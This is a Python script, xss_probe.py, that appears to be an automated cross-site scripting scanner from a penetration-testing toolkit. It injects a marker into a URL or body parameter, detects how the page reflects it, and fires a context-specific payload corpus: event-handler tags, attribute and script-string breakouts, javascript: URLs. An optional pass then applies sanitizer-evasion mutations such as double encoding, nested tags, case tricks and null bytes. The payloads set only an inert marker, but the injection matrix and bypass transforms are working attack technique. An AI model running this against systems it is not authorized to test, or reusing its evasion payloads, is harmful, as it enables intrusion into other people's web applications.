#!/usr/bin/env python3
"""xss_probe.py — full-corpus XSS context probe. One Bash call, JSON out.

Stdlib only. Honors HTTP(S)_PROXY / ALL_PROXY env (the ARTEX capture proxy)
and trusts SSL_CERT_FILE when set, so every probe is recorded as evidence.

Workflow per point:
  1. baseline  — reflect a neutral marker, detect the sink context
  2. corpus    — full payload matrix for the detected context (or --context)
  3. --mutate  — sanitizer-escape mutation pass (double-decode desync)

Usage:
  python3 xss_probe.py --url 'http://host/page' --param 'id'
                       [--method POST] [--body '{"id":"x"}']
                       [--header 'X: y']... [--context attr-dq]
                       [--mutate] [--out /tmp/xss_id.json]

Payloads are inert markers (__xss_marker). No external callbacks.
"""
import argparse
import concurrent.futures as cf
import html
import json
import os
import re
import ssl
import urllib.error
import urllib.parse
import urllib.request

MARK = "__xss_marker"
BASE = "zx9probe"          # neutral baseline marker
TIMEOUT = 10
MAX_BODY = 120_000

# context -> [(payload, proof-regex-on-raw-response)]
CORPUS = {
    "html": [
        ("<marquee onstart=\"%s=1\">" % MARK, r"<marquee onstart=[\"']%s=1" % MARK),
        ("<svg onload=\"%s=1\">" % MARK, r"<svg onload=[\"']%s=1" % MARK),
        ("<img src=x onerror=\"%s=1\">" % MARK, r"onerror=[\"']%s=1" % MARK),
        ('<iframe srcdoc="<script>%s=1</script>">' % MARK, r"srcdoc="),
        ("<details open ontoggle=\"%s=1\">" % MARK, r"ontoggle=[\"']%s=1" % MARK),
    ],
    "attr-dq": [
        ('" onmouseover="%s=1" ' % MARK, r'''["']\s*onmouseover=["\u0022]'''),
        ('"/onmouseover="%s=1" ' % MARK, r'''["']\s*/onmouseover=["\u0022]'''),
        ('" autofocus onfocus="%s=1" ' % MARK, r'''["']\s*autofocus onfocus=["\u0022]'''),
    ],
    "attr-sq": [
        ("' onmouseover=\"%s=1\" " % MARK, r'''onmouseover=["']%s=["']''' % MARK),
        ("' autofocus onfocus=\"%s=1\" " % MARK, r'''["']\s*autofocus onfocus=["']'''),
        ("'/onmouseover=\"%s=1\" " % MARK, r'''["']\s*/onmouseover=["']'''),
    ],
    "attr-nq": [
        (' onmouseover="%s=1" ' % MARK, r"\sonmouseover=[\"']%s=1[\"']" % MARK),
        (' autofocus onfocus="%s=1" ' % MARK, r"\sautofocus onfocus=[\"']"),
    ],
    # (?<!\\) — a backslash-escaped quote does not terminate the string
    "js-str": [
        ("';%s=1;//" % MARK, r'''(?<!\\)["']\s*;\s*%s\s*=\s*1''' % MARK),
        ("\\';%s=1;//" % MARK, r'''(?<!\\)["']\s*;\s*%s\s*=\s*1''' % MARK),
        ("');%s=1;//" % MARK, r'''(?<!\\)["']\)\s*;\s*%s\s*=\s*1''' % MARK),
    ],
    "js-dq": [
        ('";%s=1;//' % MARK, r'''(?<!\\)["']\s*;\s*%s\s*=\s*1''' % MARK),
    ],
    "js-expr": [
        (";%s=1//" % MARK, r"[;,\s]%s\s*=\s*1//" % MARK),
        (",%s=1," % MARK, r",\s*%s\s*=\s*1\s*," % MARK),
    ],
    "js-comment": [
        ("*/%s=1;/*" % MARK, r"\*/\s*%s\s*=\s*1" % MARK),
    ],
    "url": [
        ("#javascript:%s=1" % MARK, r"#javascript:\s*%s=1" % MARK),
        ("javascript:%s=1" % MARK, r"javascript:\s*%s=1" % MARK),
    ],
    "style": [
        ('</style><marquee onstart="%s=1">' % MARK, r"</style><marquee"),
    ],
    "json": [
        ('</script><marquee onstart="%s=1">' % MARK, r"</script><marquee"),
    ],
    "form-action": [
        ("javascript:%s=1" % MARK, r"javascript:\s*%s=1" % MARK),
    ],
}

# cross-context transition rows (tag, payload, proof) — they test the escape
# from the detected context, so pick the quote that actually delimits it
TRANS_DQ = [("transition", '"><svg onload="%s=1">' % MARK, r'''["']\s*>\s*<svg\s+onload''')]
TRANS_SQ = [("transition", "'><img src=x onerror=\"%s=1\">" % MARK, r'''["']\s*>\s*<img\s+src=x\s+onerror''')]
TRANS_ALL = TRANS_DQ + TRANS_SQ

MASTER_ORDER = ("html", "attr-dq", "attr-sq", "js-str", "url")
CTX_KEYS = set(CORPUS) | {"unknown", "dom-sink"}

MUTATIONS = [
    ("d1-pct", lambda p: urllib.parse.quote(p, safe="")),
    ("d2-pct2", lambda p: urllib.parse.quote(urllib.parse.quote(p, safe=""), safe="")),
    ("d3-plus", lambda p: p.replace(" ", "+")),
    ("d4-uni", lambda p: p.replace("<", "\\u003c").replace(">", "\\u003e")),
    ("d5-nested", lambda p: p.replace("<scr", "<scr<script>").replace("<mar", "<ma<marquee>que")),
    ("d6-case", lambda p: re.sub(r"<([a-z])", lambda m: "<" + m.group(1).upper(), p)),
    ("d7-eventcase", lambda p: p.replace("onmouseover", "oNmouseOver").replace("onerror", "onErRor").replace("onstart", "onSTArt")),
    ("d8-tab", lambda p: p.replace(" ", "\t")),
    ("d9-null", lambda p: p.replace("onerror=", "on\0error=").replace("\0", "%00")),
    ("d10-attrspace", lambda p: p.replace(' onmouseover=', ' onmouseover\t=')),
]


def ctx_ssl():
    ca = os.environ.get("SSL_CERT_FILE") or os.environ.get("CURL_CA_BUNDLE")
    if ca and os.path.exists(ca):
        return ssl.create_default_context(cafile=ca)
    return ssl.create_default_context()


def do_request(url, method, headers, body, ctx):
    data = body.encode("utf-8") if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    for k, v in headers:
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT, context=ctx) as r:
            raw = r.read(MAX_BODY + 1)
            return r.status, r.headers.get("Content-Security-Policy"), raw, None
    except urllib.error.HTTPError as e:
        raw = e.read(MAX_BODY + 1)
        return e.code, (e.headers.get("Content-Security-Policy") if e.headers else None), raw, None
    except Exception as e:  # noqa: BLE001 — report, never crash
        return None, None, None, "%s: %s" % (type(e).__name__, e)


def norm(s):
    return html.unescape(s).lower()


def snippet(text, pat, span=110):
    m = re.search(pat, text, re.S)
    if not m:
        return None
    a, b = max(0, m.start() - span // 2), min(len(text), m.end() + span // 2)
    return text[a:b]


def inject(url, method, param, body, payload):
    if body is not None:
        try:
            doc = json.loads(body)
            _setkey(doc, param, payload)
            return url, json.dumps(doc, ensure_ascii=False)
        except Exception:
            doc = urllib.parse.parse_qs(body, keep_blank_values=True)
            doc[param] = [payload]
            return url, urllib.parse.urlencode(doc, doseq=True)
    q = urllib.parse.urlsplit(url)
    query = urllib.parse.parse_qsl(q.query, keep_blank_values=True)
    for i, (k, _) in enumerate(query):
        if k == param:
            query[i] = (k, payload)
            break
    else:
        query.append((param, payload))
    return urllib.parse.urlunsplit((q.scheme, q.netloc, q.path,
                                    urllib.parse.urlencode(query, doseq=True), q.fragment)), None


def _setkey(doc, key, val):
    if isinstance(doc, dict):
        for k, v in doc.items():
            if k == key and isinstance(v, (str, int, float)):
                doc[k] = val
                return
            _setkey(v, key, val)
    elif isinstance(doc, list):
        for v in doc:
            _setkey(v, key, val)


def detect_context(text):
    i = text.find(BASE)
    if i < 0:
        return "unknown", None
    pre = text[max(0, i - 300):i]
    tail = text[max(0, i - 8):i]
    snip = text[max(0, i - 40):i + 20]
    if "<script" in pre.lower() and "</script" not in pre.lower():
        return ("js-dq" if tail.rstrip().endswith('"') else
                "js-str" if tail.rstrip().endswith("'") else "js-expr"), snip
    if "<style" in pre.lower() and "</style" not in pre.lower():
        return "style", snip
    if tail.rstrip().endswith('=\\u0022') or tail.rstrip().endswith('\\"'):
        return "js-dq", snip
    if re.search(r'(href|src|action|url|srcdoc)\s*=\s*$', tail, re.I):
        return "url", snip
    if tail.rstrip().endswith('="'):
        return "attr-dq", snip
    if tail.rstrip().endswith("='"):
        return "attr-sq", snip
    if tail.rstrip().endswith("="):
        return "attr-nq", snip
    if re.search(r'"[^=]*=\s*$', pre[-60:]):
        return "attr-dq", snip
    return "html", snip


def run_point(url, method, param, body, headers, context, mutate, ctx):
    if context == "dom-sink":
        return {"context": "dom-sink",
                "note": "static DOM sink — trace source→sink in the JS bundle; no server-side corpus",
                "results": []}

    # 1. baseline → context detection
    bu, bb = inject(url, method, param, body, BASE)
    bstatus, bcsp, braw, berr = do_request(bu, method, headers, bb, ctx)
    btext = braw.decode("utf-8", "replace") if braw else ""
    detected, baseline_snip = detect_context(btext)
    if context == "unknown":
        context = detected
    if context in ("attr-dq", "js-dq"):
        trans = TRANS_DQ
    elif context in ("attr-sq", "js-str"):
        trans = TRANS_SQ
    else:
        trans = TRANS_ALL
    if context == "unknown":
        rows = [(c, p, rx) for c in MASTER_ORDER for p, rx in CORPUS[c]] + TRANS_ALL
    else:
        rows = [(context, p, rx) for p, rx in CORPUS.get(context, [])] + trans

    results = []

    def one(payload, proof, row_ctx, mut_tag=None):
        u, b = inject(url, method, param, body, payload)
        status, csp, raw, err = do_request(u, method, headers, b, ctx)
        text = raw.decode("utf-8", "replace") if raw else ""
        reflected = bool(raw) and (norm(payload) in norm(text) or MARK in text)
        hit = re.search(proof, text, re.S)
        tag = ("mut:%s:%s" % (row_ctx, mut_tag)) if mut_tag else row_ctx
        entry = {
            "tag": tag,
            "sent": payload[:120],
            "status": status,
            "reflected": reflected,
            "broken": bool(hit),
            "evidence": snippet(text, proof) if hit else None,
        }
        if mut_tag:
            entry["reflected_raw"] = snippet(text, MARK, 60) if reflected else None
        if csp and "csp" not in entry:
            entry["csp"] = csp[:300]
        if err:
            entry["error"] = err
        return entry

    with cf.ThreadPoolExecutor(max_workers=4) as ex:
        futs = [ex.submit(one, p, rx, rc) for rc, p, rx in rows]
        results = [f.result() for f in futs]

    if mutate:
        base_p, base_rx = CORPUS.get(context, CORPUS["html"])[0]
        with cf.ThreadPoolExecutor(max_workers=4) as ex:
            futs = [ex.submit(one, fn(base_p), base_rx, context, tid)
                    for tid, fn in MUTATIONS]
            results.extend(f.result() for f in futs)

    if bcsp:
        for e in results[:1]:
            e["csp"] = bcsp[:300]

    def relevant(tag):
        return tag == context or tag == "transition" or str(tag).startswith("mut:%s:" % context)

    n_broken = sum(1 for r in results if r["broken"] and relevant(r["tag"]))
    n_broken_other = sum(1 for r in results if r["broken"] and not relevant(r["tag"]))
    n_refl = sum(1 for r in results if r["reflected"])
    if n_broken:
        verdict = "BREAK"
    elif n_broken_other:
        verdict = "BREAK_CONTEXT_MISMATCH"
    elif n_refl:
        verdict = "REFLECTED_ESCAPED"
    else:
        verdict = "NO_REFLECTION"
    return {
        "url": url, "param": param, "method": method,
        "detected_context": detected, "probed_context": context,
        "baseline_snippet": baseline_snip,
        "verdict": verdict,
        "n_broken": n_broken, "n_broken_other": n_broken_other,
        "n_reflected": n_refl, "n_total": len(results),
        "note": ("tag == probed_context means the break matches the detected sink; "
                 "other tags are cross-context probes for your review") if context != "unknown" else
                "context was unknown — all master rows were sent",
        "results": results,
    }


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--param", required=True)
    ap.add_argument("--method", default="GET")
    ap.add_argument("--body", default=None)
    ap.add_argument("--header", action="append", default=[])
    ap.add_argument("--context", default="unknown", choices=sorted(CTX_KEYS))
    ap.add_argument("--mutate", action="store_true")
    ap.add_argument("--out", default=None)
    a = ap.parse_args()

    headers = []
    for h in a.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers.append((k.strip(), v.strip()))
    if not any(k.lower() == "content-type" for k, _ in headers) and a.body:
        headers.append(("Content-Type", "application/json"))

    out = run_point(a.url, a.method.upper(), a.param, a.body, headers, a.context, a.mutate, ctx_ssl())
    s = json.dumps(out, ensure_ascii=False, indent=1)
    print(s)
    if a.out:
        with open(a.out, "w", encoding="utf-8") as f:
            f.write(s)


if __name__ == "__main__":
    main()
